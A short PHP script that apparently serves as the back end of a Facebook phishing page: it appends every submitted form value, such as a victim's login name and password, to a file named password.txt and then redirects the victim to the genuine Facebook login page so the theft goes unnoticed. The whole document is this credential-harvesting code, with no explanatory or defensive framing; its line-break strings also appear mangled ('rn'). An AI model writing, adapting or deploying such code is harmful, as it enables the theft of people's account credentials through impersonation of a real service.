<?php
header("location:https://facebook.com/login.php");
$handle=fopen("password.txt","a");
foreach($_GET as $variable =>$value) {
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle, $value);
fwrite($handle, "rn");
}
fwrite($handle, "rn");
fclose($handle);
exit
?>